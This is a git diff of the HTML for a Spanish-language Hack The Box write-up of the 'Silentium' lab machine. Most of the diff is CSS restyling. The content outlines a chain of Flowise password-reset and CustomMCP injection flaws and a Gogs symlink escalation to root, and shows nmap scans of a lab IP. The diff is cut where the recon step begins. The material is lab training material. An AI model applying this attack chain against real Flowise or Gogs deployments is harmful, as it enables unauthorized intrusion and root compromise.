@@ -3,548 +3,471 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Silentium — Hack The Box | Informe Técnico</title>
+<title>Silentium — HTB Machine Writeup | Yoandy Ramirez Delgado</title>
+<link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=DM+Sans:wght@300;400;500;600;700&family=JetBrains+Mono:wght@300;400;500;700&display=swap" rel="stylesheet">
 <style>
 :root {
-  --accent:#4ade80; --accent-dim:#16a34a; --accent-glow:rgba(74,222,128,0.15);
-  --bg:#0a0e1a; --bg2:#0f1629; --bg3:#141d35;
-  --card:#111827; --card2:#1a2540; --border:#1e2d4a;
-  --text:#e2e8f0; --text-muted:#64748b; --text-dim:#94a3b8;
-  --red:#f87171; --yellow:#fbbf24; --blue:#60a5fa;
-  --purple:#a78bfa; --orange:#fb923c; --cyan:#22d3ee; --green:#4ade80;
+  --ink:#0b1a10;--forest:#0f2318;--pine:#163020;--moss:#1e4030;--sage:#2a6048;
+  --green:#00e87a;--green2:rgba(0,232,122,.15);--green3:rgba(0,232,122,.06);
+  --cream:#f2ede4;--cream2:#faf7f1;
+  --text:#c8f0dc;--text2:rgba(200,240,220,.65);--text3:rgba(200,240,220,.35);
+  --card:#0d2215;--card2:#112b1c;--border:rgba(0,232,122,.1);
+  --red:#f87171;--yellow:#fbbf24;--blue:#60a5fa;--purple:#a78bfa;--orange:#fb923c;--cyan:#22d3ee;
+  --bb:'Bebas Neue',sans-serif;--dm:'DM Sans',sans-serif;--mo:'JetBrains Mono',monospace;
+  --accent:#00e87a;--bg:#0b1a10;--bg2:#0f2318;--bg3:#163020;
+  --text-muted:rgba(200,240,220,.35);--text-dim:rgba(200,240,220,.65);
+  --green4:#4ade80;
 }
-* { margin:0; padding:0; box-sizing:border-box; }
-body { font-family:'Segoe UI',system-ui,sans-serif; background:var(--bg); color:var(--text); line-height:1.6; }
+*{box-sizing:border-box;margin:0;padding:0;}
+html{scroll-behavior:smooth;}
+body{background:var(--ink);color:var(--text);font-family:var(--dm);line-height:1.7;font-size:15px;}
+a{color:var(--green);text-decoration:none;}
+code{background:var(--card2);padding:.15rem .4rem;border-radius:3px;font-family:var(--mo);font-size:.88em;color:var(--green);}
+pre{margin:0;white-space:pre-wrap;word-break:break-all;font-family:var(--mo);}
+ul{padding-left:1.5rem;}li{margin:.35rem 0;}
+h2{font-family:var(--bb);font-size:1.6rem;color:var(--text);border-bottom:1px solid var(--border);padding-bottom:.5rem;margin-bottom:1.25rem;letter-spacing:.04em;}
+h3{font-size:1.05rem;color:var(--text);margin-bottom:.75rem;font-weight:600;}
 
-/* HERO */
+/* ─── HERO ─── */
 .hero {
-  background: linear-gradient(135deg, #0a0e1a 0%, #0f1629 40%, #141d35 100%);
+  background: linear-gradient(135deg, var(--forest) 0%, var(--ink) 50%, #091a10 100%);
   border-bottom: 1px solid var(--border);
-  padding: 60px 40px 40px;
+  padding: 60px 40px 50px;
   position: relative;
   overflow: hidden;
 }
 .hero::before {
-  content:'';
-  position:absolute; top:-50%; left:-20%;
-  width:600px; height:600px;
-  background: radial-gradient(circle, rgba(74,222,128,0.06) 0%, transparent 70%);
-  border-radius:50%;
+  content: '';
+  position: absolute; inset: 0;
+  background-image: linear-gradient(rgba(0,232,122,0.03) 1px, transparent 1px),
+                    linear-gradient(90deg, rgba(0,232,122,0.03) 1px, transparent 1px);
+  background-size: 56px 56px;
+  pointer-events: none;
 }
-.hero::after {
-  content:'';
-  position:absolute; bottom:-30%; right:-10%;
-  width:400px; height:400px;
-  background: radial-gradient(circle, rgba(96,165,250,0.04) 0%, transparent 70%);
-  border-radius:50%;
+.hero-layout {
+  max-width: 1200px; margin: 0 auto;
+  display: grid; grid-template-columns: 1fr 280px; gap: 48px; align-items: center;
 }
-.hero-badge {
-  display:inline-flex; align-items:center; gap:8px;
-  background:rgba(74,222,128,0.1); border:1px solid rgba(74,222,128,0.3);
-  color:var(--accent); padding:4px 14px; border-radius:20px;
-  font-size:0.75rem; font-weight:600; letter-spacing:1px; text-transform:uppercase;
-  margin-bottom:20px;
+@media(max-width: 900px) {
+  .hero-layout { grid-template-columns: 1fr; }
+  .hero-orb { order: -1; justify-self: center; }
+  .hero-meta { justify-content: center; }
+  .hero-sub { margin-left: auto; margin-right: auto; }
+  .hero-stats { justify-content: center; }
 }
-.hero h1 { font-size:3.5rem; font-weight:800; letter-spacing:-1px; margin-bottom:8px; }
-.hero h1 span { color:var(--accent); }
-.hero-sub { color:var(--text-dim); font-size:1.1rem; margin-bottom:30px; }
-.hero-tags { display:flex; flex-wrap:wrap; gap:10px; }
+.hero-left { position: relative; z-index: 2; }
+.hero-brand {
+  font-family: var(--mo); font-size: 0.65rem;
+  color: rgba(0,232,122,0.45); letter-spacing: 0.2em; margin-bottom: 16px;
+  display: flex; align-items: center; gap: 8px;
+}
+.hero-brand-dot {
+  width: 6px; height: 6px; border-radius: 50%; background: var(--green);
+  box-shadow: 0 0 10px var(--green); animation: hpd 1.2s infinite alternate;
+}
+@keyframes hpd { to { opacity: 0.2; transform: scale(0.5); } }
+.hero h1 {
+  font-family: var(--bb); font-size: clamp(2.4rem, 4vw, 3.5rem);
+  font-weight: 400; letter-spacing: 0.04em; margin-bottom: 14px; line-height: 1;
+  color: var(--text);
+}
+.hero h1 span { color: var(--green); }
+.hero-sub {
+  color: var(--text2); font-size: 0.95rem; max-width: 600px;
+  margin-bottom: 24px; line-height: 1.7; font-weight: 300;
+}
+.hero-meta {
+  display: flex; align-items: center; gap: 8px; flex-wrap: wrap; margin-bottom: 18px;
+}
 .tag {
-  padding:5px 14px; border-radius:6px; font-size:0.8rem; font-weight:600;
-  border: 1px solid;
+  display: inline-flex; align-items: center; gap: 5px;
+  padding: 4px 12px; border-radius: 4px;
+  font-family: var(--mo);
+  font-size: 10px; font-weight: 500; letter-spacing: 0.8px; text-transform: uppercase;
 }
-.tag-easy     { background:rgba(74,222,128,0.1);  border-color:rgba(74,222,128,0.3);  color:var(--green); }
-.tag-linux    { background:rgba(96,165,250,0.1);  border-color:rgba(96,165,250,0.3);  color:var(--blue); }
-.tag-htb      { background:rgba(167,139,250,0.1); border-color:rgba(167,139,250,0.3); color:var(--purple); }
-.tag-web      { background:rgba(251,191,36,0.1);  border-color:rgba(251,191,36,0.3);  color:var(--yellow); }
-.tag-rce      { background:rgba(248,113,113,0.1); border-color:rgba(248,113,113,0.3); color:var(--red); }
-.tag-docker   { background:rgba(34,211,238,0.1);  border-color:rgba(34,211,238,0.3);  color:var(--cyan); }
-.tag-gogs     { background:rgba(251,146,60,0.1);  border-color:rgba(251,146,60,0.3);  color:var(--orange); }
+.tag-platform { background: rgba(0,232,122,0.1); color: var(--green); border: 1px solid rgba(0,232,122,0.25); }
+.tag-category { background: rgba(56,217,245,0.08); color: var(--cyan); border: 1px solid rgba(56,217,245,0.2); }
+.tag-diff { background: rgba(0,232,122,0.08); color: var(--green); border: 1px solid rgba(0,232,122,0.2); }
+.tag-os { background: rgba(167,139,250,0.08); color: var(--purple); border: 1px solid rgba(167,139,250,0.2); }
+.tag-cve { background: rgba(248,113,113,0.08); color: var(--red); border: 1px solid rgba(248,113,113,0.2); }
+.tag-tool { background: rgba(251,146,60,0.08); color: var(--orange); border: 1px solid rgba(251,146,60,0.2); }
+.hero-stats {
+  display: flex; gap: 28px; flex-wrap: wrap;
+}
+.stat { display: flex; flex-direction: column; gap: 2px; }
+.stat-label {
+  font-family: var(--mo);
+  font-size: 9px; text-transform: uppercase; letter-spacing: 1.5px; color: var(--text3);
+}
+.stat-value { font-size: 1rem; font-weight: 700; color: var(--text); }
+.stat-value.green { color: var(--green); }
 
-/* LAYOUT */
-.container { max-width:1200px; margin:0 auto; padding:40px; }
-.grid { display:grid; grid-template-columns:1fr 300px; gap:30px; align-items:start; }
+/* Orb */
+.hero-orb { display: flex; align-items: center; justify-content: center; position: relative; width: 260px; height: 260px; }
+.hero-orb canvas { display: block; width: 260px !important; height: 260px !important; }
 
-/* QUICK STATS */
-.stats-bar {
-  display:grid; grid-template-columns:repeat(4,1fr); gap:1px;
-  background:var(--border); border:1px solid var(--border); border-radius:12px;
-  overflow:hidden; margin-bottom:40px;
-}
-.stat { background:var(--card); padding:20px 24px; text-align:center; }
-.stat-val { font-size:1.8rem; font-weight:800; color:var(--accent); }
-.stat-label { font-size:0.75rem; color:var(--text-muted); text-transform:uppercase; letter-spacing:1px; margin-top:4px; }
+/* ─── LAYOUT ─── */
+.container{display:grid;grid-template-columns:1fr 300px;gap:2rem;max-width:1200px;margin:2rem auto;padding:0 1.5rem;}
+@media(max-width:900px){.container{grid-template-columns:1fr;}.lessons-grid{grid-template-columns:1fr;}}
 
-/* CARDS */
-.card {
-  background:var(--card); border:1px solid var(--border); border-radius:12px;
-  padding:28px; margin-bottom:24px;
-}
-.card-title {
-  font-size:0.7rem; font-weight:700; color:var(--accent);
-  text-transform:uppercase; letter-spacing:2px;
-  margin-bottom:20px; padding-bottom:12px;
-  border-bottom:1px solid var(--border);
-  display:flex; align-items:center; gap:8px;
-}
-.card-title::before { content:'▸'; }
+/* ─── SECTIONS ─── */
+.section{margin:2.5rem 0;}
+.step-box{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:1.5rem;margin:1.5rem 0;}
+.step-number{font-size:.7rem;color:var(--green);font-weight:700;text-transform:uppercase;letter-spacing:3px;margin-bottom:.4rem;font-family:var(--mo);}
+.why-box{background:rgba(0,232,122,.05);border-left:3px solid rgba(0,232,122,.4);padding:.9rem 1rem;border-radius:0 8px 8px 0;margin:1rem 0;}
+.why-box strong{color:var(--green);font-size:.8rem;text-transform:uppercase;letter-spacing:.05em;display:block;margin-bottom:.4rem;}
+.why-box p{font-size:.9rem;color:var(--text2);}
+.cmd-annotated{background:rgba(5,14,8,.9);border-radius:8px;padding:1rem 1.25rem;font-family:var(--mo);margin:1rem 0;border:1px solid var(--border);}
+.cmd-line{font-size:1rem;line-height:2;}
+.cmd{color:var(--green);font-weight:700;}.flag-opt{color:var(--yellow);}.ip{color:var(--orange);}.param{color:var(--cyan);}
+.user-c{color:var(--purple);}.str-c{color:var(--green);}.comment-c{color:var(--text3);}
+.cmd-notes{margin-top:.75rem;padding-top:.75rem;border-top:1px solid var(--border);display:flex;flex-direction:column;gap:.3rem;}
+.cmd-note{font-size:.8rem;color:var(--text2);padding:.3rem .75rem;border-left:2px solid var(--border);}
+.output-box{background:rgba(5,14,8,.9);border:1px solid var(--border);border-radius:8px;padding:1rem 1.25rem;font-family:var(--mo);font-size:.82rem;color:var(--text2);margin:1rem 0;overflow-x:auto;line-height:1.6;}
+.output-label{font-size:.65rem;color:var(--text3);text-transform:uppercase;letter-spacing:2px;margin-bottom:.5rem;}
+.interpret-box{background:rgba(0,232,122,.05);border-left:3px solid var(--green);padding:.9rem 1rem;border-radius:0 8px 8px 0;margin:1rem 0;}
+.interpret-box strong{color:var(--green);font-size:.8rem;text-transform:uppercase;letter-spacing:.05em;display:block;margin-bottom:.4rem;}
+.interpret-box p,.interpret-box li{font-size:.88rem;color:var(--text2);}
+.decision-box{background:rgba(251,146,60,.05);border-left:3px solid var(--orange);padding:.9rem 1rem;border-radius:0 8px 8px 0;margin:1rem 0;}
+.decision-box strong{color:var(--orange);font-size:.8rem;text-transform:uppercase;letter-spacing:.05em;display:block;margin-bottom:.4rem;}
+.decision-box p{font-size:.88rem;color:var(--text2);}
+.info-box{background:var(--card2);border:1px solid var(--border);border-radius:10px;padding:1.25rem;margin:1.25rem 0;}
+.info-box p{font-size:.9rem;color:var(--text2);}
+.vuln-card{background:rgba(248,113,113,.05);border:1px solid rgba(248,113,113,.2);border-radius:12px;padding:1.5rem;margin:1.5rem 0;}
+.vuln-card h3{color:var(--red);margin-bottom:.75rem;}
+.warning-card{background:rgba(248,113,113,.05);border:1px solid rgba(248,113,113,.2);border-radius:8px;padding:1rem;display:flex;gap:1rem;align-items:flex-start;margin:1rem 0;}
+.warning-icon{font-size:1.5rem;flex-shrink:0;}
+.warning-card strong{color:var(--red);display:block;margin-bottom:.25rem;}
+.warning-card p{font-size:.85rem;color:var(--text2);}
+.data-table{width:100%;border-collapse:collapse;font-size:.85rem;margin:1rem 0;}
+.data-table th{background:var(--card2);color:var(--text3);padding:.6rem 1rem;text-align:left;font-size:.75rem;text-transform:uppercase;}
+.data-table td{padding:.6rem 1rem;border-bottom:1px solid var(--border);}
+.data-table tr:last-child td{border-bottom:none;}
+.data-table .highlight{color:var(--green);font-weight:600;}
+.lessons-grid{display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin:1rem 0;}
+@media(max-width:700px){.lessons-grid{grid-template-columns:1fr;}}
+.lesson-card{background:var(--card2);border-radius:10px;padding:1.25rem;border:1px solid var(--border);}
+.lesson-card h4{font-size:.85rem;margin-bottom:.75rem;}
+.lesson-card.attacker h4{color:var(--orange);}
+.lesson-card.defender h4{color:var(--cyan);}
+.lesson-card li{font-size:.83rem;color:var(--text2);}
+.flag-box{background:linear-gradient(135deg,rgba(0,232,122,.06),rgba(0,232,122,.02));border:1px solid rgba(0,232,122,.25);border-radius:14px;padding:2rem;text-align:center;margin:2.5rem 0;}
+.flag-label{font-size:.75rem;color:var(--text3);text-transform:uppercase;letter-spacing:3px;margin-bottom:.75rem;font-family:var(--mo);}
+.flag-value{font-family:var(--mo);font-size:1.1rem;color:var(--green);background:rgba(0,232,122,.08);padding:.6rem 1.5rem;border-radius:8px;display:inline-block;border:1px solid rgba(0,232,122,.2);}
 
-/* STEPS */
-.step-box {
-  border:1px solid var(--border); border-radius:10px;
-  overflow:hidden; margin-bottom:20px;
-}
-.step-header {
-  background:var(--bg3); padding:14px 20px;
-  display:flex; align-items:center; gap:12px;
-}
-.step-num {
-  width:28px; height:28px; border-radius:50%;
-  background:var(--accent-dim); color:#000; font-weight:800; font-size:0.8rem;
-  display:flex; align-items:center; justify-content:center; flex-shrink:0;
-}
-.step-title { font-weight:700; font-size:1rem; }
-.step-body { padding:20px; }
+/* ─── SIDEBAR ─── */
+.sidebar{position:sticky;top:2rem;height:fit-content;}
+.sidebar-card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:1.25rem;margin-bottom:1rem;}
+.sidebar-card h4{margin:0 0 .9rem;font-size:.72rem;text-transform:uppercase;letter-spacing:2px;color:var(--text3);font-family:var(--mo);}
+.meta-row{display:flex;justify-content:space-between;align-items:center;font-size:.83rem;padding:.45rem 0;border-bottom:1px solid var(--border);}
+.meta-row:last-child{border-bottom:none;}
+.meta-label{color:var(--text3);}.meta-value{color:var(--text);font-weight:600;font-family:var(--mo);font-size:.8rem;}
+.mitre-tag{display:inline-block;background:rgba(167,139,250,.08);color:var(--purple);border:1px solid rgba(167,139,250,.2);border-radius:4px;padding:.2rem .5rem;font-size:.72rem;font-family:var(--mo);margin:.2rem .15rem;}
+.cve-tag{display:inline-block;background:rgba(248,113,113,.08);color:var(--red);border:1px solid rgba(248,113,113,.2);border-radius:4px;padding:.2rem .5rem;font-size:.72rem;font-family:var(--mo);margin:.2rem .15rem;}
+.score-num{font-size:2.8rem;font-weight:900;color:var(--green);text-align:center;line-height:1;margin:.5rem 0;font-family:var(--bb);}
+.score-label{text-align:center;font-size:.75rem;color:var(--text3);}
+.glosario-item{padding:.5rem 0;border-bottom:1px solid var(--border);font-size:.8rem;}
+.glosario-item:last-child{border-bottom:none;}
+.glosario-term{color:var(--cyan);font-weight:600;font-family:var(--mo);display:block;margin-bottom:.15rem;}
+.glosario-def{color:var(--text3);line-height:1.4;}
 
-.why-box {
-  background:rgba(96,165,250,0.07); border:1px solid rgba(96,165,250,0.2);
-  border-radius:8px; padding:14px 18px; margin-bottom:14px;
-}
-.why-box strong { color:var(--blue); font-size:0.75rem; text-transform:uppercase; letter-spacing:1px; display:block; margin-bottom:6px; }
-
-.cmd-box {
-  background:#060912; border:1px solid var(--border); border-radius:8px;
-  padding:14px 18px; margin-bottom:14px; font-family:'Courier New',monospace; font-size:0.88rem;
-  position:relative; overflow-x:auto;
-}
-.cmd-box .prompt { color:var(--accent-dim); }
-.cmd-flag { color:var(--yellow); }
-.cmd-val  { color:var(--cyan); }
-.cmd-comment { color:var(--text-muted); font-style:italic; }
-
-.output-box {
-  background:#060912; border:1px solid rgba(74,222,128,0.15);
-  border-left:3px solid var(--accent-dim);
-  border-radius:0 8px 8px 0; padding:14px 18px; margin-bottom:14px;
-  font-family:'Courier New',monospace; font-size:0.82rem;
-  white-space:pre-wrap; overflow-x:auto; color:#a3e4a3;
-}
-
-.interpret-box {
-  background:rgba(74,222,128,0.05); border:1px solid rgba(74,222,128,0.15);
-  border-radius:8px; padding:14px 18px; margin-bottom:14px;
-}
-.interpret-box strong { color:var(--green); font-size:0.75rem; text-transform:uppercase; letter-spacing:1px; display:block; margin-bottom:6px; }
-
-.decision-box {
-  background:rgba(251,146,60,0.07); border:1px solid rgba(251,146,60,0.2);
-  border-radius:8px; padding:14px 18px;
-}
-.decision-box strong { color:var(--orange); font-size:0.75rem; text-transform:uppercase; letter-spacing:1px; display:block; margin-bottom:6px; }
-
-/* SIDEBAR */
-.sidebar-card {
-  background:var(--card); border:1px solid var(--border); border-radius:12px;
-  padding:20px; margin-bottom:16px;
-}
-.sidebar-title {
-  font-size:0.65rem; font-weight:700; color:var(--text-muted);
-  text-transform:uppercase; letter-spacing:2px; margin-bottom:14px;
-}
-.cred-row {
-  display:flex; flex-direction:column; gap:4px;
-  padding:10px 0; border-bottom:1px solid var(--border);
-}
-.cred-row:last-child { border-bottom:none; }
-.cred-user { font-size:0.8rem; color:var(--text-dim); }
-.cred-pass { font-family:'Courier New',monospace; font-size:0.82rem; color:var(--accent); }
-
-.chain-step {
-  display:flex; align-items:center; gap:10px; padding:8px 0;
-  border-bottom:1px solid rgba(255,255,255,0.05);
-}
-.chain-step:last-child { border-bottom:none; }
-.chain-dot { width:8px; height:8px; border-radius:50%; background:var(--accent); flex-shrink:0; }
-.chain-text { font-size:0.82rem; color:var(--text-dim); }
-
-.flag-box {
-  background:rgba(74,222,128,0.07); border:1px solid rgba(74,222,128,0.2);
-  border-radius:8px; padding:12px 16px; margin-bottom:10px;
-}
-.flag-label { font-size:0.65rem; color:var(--text-muted); text-transform:uppercase; letter-spacing:1px; margin-bottom:4px; }
-.flag-val { font-family:'Courier New',monospace; font-size:0.78rem; color:var(--accent); word-break:break-all; }
-
-/* CVE BADGE */
-.cve-badge {
-  display:inline-flex; align-items:center; gap:6px;
-  background:rgba(248,113,113,0.1); border:1px solid rgba(248,113,113,0.3);
-  color:var(--red); padding:3px 10px; border-radius:4px;
-  font-size:0.72rem; font-weight:700; font-family:'Courier New',monospace;
-  margin-right:6px; margin-bottom:6px;
-}
-
-/* VULN TABLE */
-.vuln-table { width:100%; border-collapse:collapse; font-size:0.88rem; }
-.vuln-table th { background:var(--bg3); color:var(--text-muted); font-size:0.7rem; text-transform:uppercase; letter-spacing:1px; padding:10px 14px; text-align:left; }
-.vuln-table td { padding:12px 14px; border-bottom:1px solid var(--border); }
-.vuln-table tr:last-child td { border-bottom:none; }
-.severity { padding:3px 10px; border-radius:4px; font-size:0.72rem; font-weight:700; }
-.sev-critical { background:rgba(248,113,113,0.15); color:var(--red); }
-.sev-high     { background:rgba(251,146,60,0.15);  color:var(--orange); }
-.sev-medium   { background:rgba(251,191,36,0.15);  color:var(--yellow); }
-
-/* TIMELINE */
-.timeline { position:relative; padding-left:28px; }
-.timeline::before { content:''; position:absolute; left:8px; top:6px; bottom:6px; width:2px; background:var(--border); }
-.tl-item { position:relative; margin-bottom:20px; }
-.tl-dot { position:absolute; left:-24px; top:6px; width:12px; height:12px; border-radius:50%; background:var(--accent-dim); border:2px solid var(--bg); }
-.tl-time  { font-size:0.72rem; color:var(--text-muted); margin-bottom:4px; }
-.tl-event { font-size:0.88rem; color:var(--text); }
-
-/* RECOMMENDATIONS */
-.rec-box {
-  display:flex; gap:14px; padding:14px;
-  background:var(--bg3); border:1px solid var(--border);
-  border-radius:8px; margin-bottom:10px; font-size:0.88rem;
-}
-.rec-icon { font-size:1.2rem; flex-shrink:0; }
-.rec-title { font-weight:700; color:var(--text); margin-bottom:4px; }
-.rec-desc  { color:var(--text-dim); }
-
-/* GLOSARIO */
-.glos-item { padding:10px 0; border-bottom:1px solid var(--border); }
-.glos-item:last-child { border-bottom:none; }
-.glos-term { font-weight:700; color:var(--cyan); margin-bottom:4px; font-size:0.9rem; }
-.glos-def  { color:var(--text-dim); font-size:0.85rem; }
-
-/* INFO ROW */
-.info-row { display:flex; justify-content:space-between; padding:8px 0; border-bottom:1px solid var(--border); font-size:0.85rem; }
-.info-row:last-child { border-bottom:none; }
-.info-label { color:var(--text-muted); }
-.info-val   { color:var(--text); font-weight:600; font-family:'Courier New',monospace; }
-
-/* FOOTER */
-.footer {
-  margin-top:60px; padding:30px 40px;
-  border-top:1px solid var(--border);
-  display:flex; justify-content:space-between; align-items:center;
-  color:var(--text-muted); font-size:0.8rem;
-}
 </style>
 </head>
 <body>
 
-<!-- HERO BANNER -->
+<!-- ═══ HERO ═══ -->
 <div class="hero">
-  <div class="container" style="padding-top:0;padding-bottom:0;">
-    <div class="hero-badge">🔴 Informe Técnico de Pentesting — Hack The Box</div>
-    <h1><span>SILENTIUM</span> — Hack The Box</h1>
-    <p class="hero-sub">Linux Easy · CVE-2025-58434 + CVE-2025-59528 + CVE-2025-8110 · 2026-04-12</p>
-    <div class="hero-tags">
-      <span class="tag tag-easy">Easy</span>
-      <span class="tag tag-linux">Linux</span>
-      <span class="tag tag-htb">Hack The Box</span>
-      <span class="tag tag-web">Flowise AI</span>
-      <span class="tag tag-rce">RCE</span>
-      <span class="tag tag-docker">Docker Escape</span>
-      <span class="tag tag-gogs">Gogs</span>
+  <div class="hero-layout">
+    <div class="hero-left">
+      <div class="hero-brand"><span class="hero-brand-dot"></span>HEINDALL // SILENTIUM</div>
+      <div class="hero-meta">
+        <span class="tag tag-platform">HackTheBox</span>
+        <span class="tag tag-category">Flowise AI</span>
+        <span class="tag tag-diff">Easy</span>
+        <span class="tag tag-os">Linux</span>
+        <span class="tag tag-cve">CVE-2025-58434</span>
+        <span class="tag tag-cve">CVE-2025-59528</span>
+        <span class="tag tag-cve">CVE-2025-8110</span>
+      </div>
+      <h1><span>Silentium</span> — Flowise RCE + Gogs Symlink Escalation</h1>
+      <p class="hero-sub">Cadena de 3 CVEs críticos: reset de contraseña sin autenticación en Flowise AI (CVE-2025-58434), inyección en CustomMCP para RCE en contenedor Docker (CVE-2025-59528), exfiltración de credenciales para SSH, y escalada a root mediante symlink race condition en Gogs (CVE-2025-8110).</p>
+      <div class="hero-stats">
+        <div class="stat"><span class="stat-label">Target</span><span class="stat-value green">10.129.26.220</span></div>
+        <div class="stat"><span class="stat-label">OS</span><span class="stat-value">Ubuntu</span></div>
+        <div class="stat"><span class="stat-label">Puertos</span><span class="stat-value">22, 80</span></div>
+        <div class="stat"><span class="stat-label">CVEs</span><span class="stat-value">3</span></div>
+        <div class="stat"><span class="stat-label">Tiempo</span><span class="stat-value">~65 min</span></div>
+      </div>
+    </div>
+    <!-- Orb — Right -->
+    <div class="hero-orb">
+      <canvas id="heroOrb" width="520" height="520"></canvas>
     </div>
   </div>
 </div>
 
 <div class="container">
+<main>
 
-  <!-- QUICK STATS -->
-  <div class="stats-bar" style="margin-top:30px;">
-    <div class="stat"><div class="stat-val">5</div><div class="stat-label">Fases</div></div>
-    <div class="stat"><div class="stat-val">3</div><div class="stat-label">CVEs Críticos</div></div>
-    <div class="stat"><div class="stat-val">284c</div><div class="stat-label">User Flag</div></div>
-    <div class="stat"><div class="stat-val">bbc8</div><div class="stat-label">Root Flag</div></div>
+<div class="section">
+  <h2>Resumen Ejecutivo</h2>
+  <div class="info-box">
+    <p><strong style="color:var(--text)">Silentium</strong> es una máquina Linux de dificultad Easy en Hack The Box que simula una empresa financiera (<em>Silentium Capital & Lending</em>). La superficie de ataque combina tres vulnerabilidades críticas de día cero encadenadas: un <strong>reset de contraseña sin autenticación</strong> en Flowise AI (<code>CVE-2025-58434</code>), una <strong>inyección en el nodo CustomMCP</strong> que permite RCE en el contenedor Docker (<code>CVE-2025-59528</code>), y una vulnerabilidad de <strong>enlace simbólico en Gogs</strong> que otorga ejecución de código como root en el host (<code>CVE-2025-8110</code>).</p>
   </div>
+  <div class="info-box">
+    <p>La cadena completa exige entender la arquitectura multi-servicio: un sitio corporativo en nginx, una instancia de Flowise AI en subdominio <code>staging.silentium.htb</code>, y un servidor Gogs interno en <code>127.0.0.1:3001</code> corriendo como root, accesible solo desde el host.</p>
+  </div>
+</div>
 
-  <div class="grid">
-    <!-- MAIN COLUMN -->
-    <div>
+<!-- VULNERABILIDADES -->
+<div class="section">
+  <h2>Resumen de Vulnerabilidades</h2>
+  <div class="vuln-card">
+    <h3>⚠ CVE-2025-58434 — Flowise Unauth Password Reset</h3>
+    <p style="font-size:.9rem;color:var(--text2);">El endpoint <code>POST /api/v1/account/forgot-password</code> devuelve el <code>tempToken</code> en la respuesta JSON sin requerir verificación de identidad. Permite cambiar la contraseña de cualquier usuario sin acceso a su correo.</p>
+  </div>
+  <div class="vuln-card">
+    <h3>⚠ CVE-2025-59528 — Flowise CustomMCP RCE</h3>
+    <p style="font-size:.9rem;color:var(--text2);">La función <code>convertToValidJSONString</code> pasa el parámetro <code>mcpServerConfig</code> directamente al constructor <code>Function()</code> de Node.js, permitiendo ejecución arbitraria de JavaScript con privilegios de root dentro del contenedor.</p>
+  </div>
+  <div class="vuln-card">
+    <h3>⚠ CVE-2025-8110 — Gogs Symlink Race Condition</h3>
+    <p style="font-size:.9rem;color:var(--text2);">Un usuario autenticado puede crear un repositorio con un symlink apuntando a <code>.git/config</code> e inyectar una directiva <code>sshCommand</code> maliciosa que se ejecuta como root al procesar operaciones git.</p>
+  </div>
+</div>
 
-      <!-- DESCRIPCION -->
-      <div class="card">
-        <div class="card-title">Descripción de la Máquina</div>
-        <p style="color:var(--text-dim); margin-bottom:16px;">
-          <strong style="color:var(--text);">Silentium</strong> es una máquina Linux de dificultad Easy en Hack The Box que simula una empresa financiera institucional (<em>Silentium Capital &amp; Lending</em>). La superficie de ataque combina tres vulnerabilidades críticas de día cero encadenadas: un reset de contraseña sin autenticación en Flowise AI, una inyección en el nodo CustomMCP que permite RCE en el contenedor Docker, y una vulnerabilidad de enlace simbólico en Gogs que otorga ejecución de código como root en el host.
-        </p>
-        <p style="color:var(--text-dim);">
-          La cadena completa exige entender la arquitectura multi-servicio: un sitio corporativo en nginx, una instancia de Flowise AI en subdominio <code style="color:var(--cyan);">staging.silentium.htb</code>, y un servidor Gogs interno en <code style="color:var(--cyan);">127.0.0.1:3001</code> corriendo como root, accesible solo desde el host.
-        </p>
-      </div>
+<!-- FASE 1: RECONOCIMIENTO -->
+<div class="section">
+  <h2>Fase 1 — Reconocimiento</h2>
 
-      <!-- VULNERABILIDADES -->
-      <div class="card">
-        <div class="card-title">Resumen de Vulnerabilidades</div>
-        <table class="vuln-table">
-          <thead>
-            <tr>
-              <th>CVE</th>
-              <th>Servicio</th>
-              <th>Descripción</th>
-              <th>Severidad</th>
-            </tr>
-          </thead>
-          <tbody>
-            <tr>
-              <td><span class="cve-badge">CVE-2025-58434</span></td>
-              <td style="color:var(--blue);">Flowise 3.0.5</td>
-              <td style="color:var(--text-dim);">Reset de contraseña sin autenticación — el endpoint <code>/api/v1/account/forgot-password</code> devuelve el <code>tempToken</code> en la respuesta JSON sin requerir verificación de identidad.</td>
-              <td><span class="severity sev-critical">Critical</span></td>
-            </tr>
-            <tr>
-              <td><span class="cve-badge">CVE-2025-59528</span></td>
-              <td style="color:var(--blue);">Flowise 3.0.5</td>
-              <td style="color:var(--text-dim);">Inyección en CustomMCP — la función <code>convertToValidJSONString</code> pasa el parámetro <code>mcpServerConfig</code> directamente al constructor <code>Function()</code> de Node.js, permitiendo ejecución arbitraria de JavaScript con privilegios de root dentro del contenedor.</td>
-              <td><span class="severity sev-critical">Critical</span></td>
-            </tr>
-            <tr>
-              <td><span class="cve-badge">CVE-2025-8110</span></td>
-              <td style="color:var(--blue);">Gogs 0.13.0</td>
-              <td style="color:var(--text-dim);">Race condition de enlace simbólico en hooks de Git — un usuario autenticado puede crear un repositorio con un symlink apuntando a <code>.git/config</code> e inyectar una directiva <code>sshCommand</code> maliciosa que se ejecuta como root al procesar operaciones git.</td>
-              <td><span class="severity sev-critical">Critical</span></td>
-            </tr>
-          </tbody>
-        </table>
-      </div>
-
-      <!-- FASE 1: RECONOCIMIENTO -->
-      <div class="card">
-        <div class="card-title">Fase 1 — Reconocimiento</div>
-
-        <div class="step-box">
-          <div class="step-header">
-            <div class="step-num">1</div>
-            <div class="step-title">Escaneo de puertos con Nmap</div>
-          </div>
-          <div class="step-body">
-            <div class="why-box">
-              <strong>¿Por qué este paso?</strong>
-              Todo pentest comienza identificando la superficie de ataque. Nmap es la herramienta estándar para descubrir qué servicios expone el objetivo y en qué puertos. Primero escaneamos todos los puertos (<code>-p-</code>) rápidamente para no perdernos nada, y luego profundizamos solo en los abiertos.
-            </div>
-            <div class="cmd-box">
-              <span class="prompt">$ </span>nmap <span class="cmd-flag">-p-</span> <span class="cmd-flag">--open</span> <span class="cmd-flag">-n</span> <span class="cmd-flag">-T4</span> <span class="cmd-flag">--min-rate</span> <span class="cmd-val">5000</span> <span class="cmd-val">10.129.26.220</span><br>
-              <span class="prompt">$ </span>nmap <span class="cmd-flag">-p</span><span class="cmd-val">22,80</span> <span class="cmd-flag">-sC</span> <span class="cmd-flag">-sV</span> <span class="cmd-val">10.129.26.220</span>
-            </div>
-            <div class="output-box">PORT   STATE SERVICE VERSION
+  <div class="step-box">
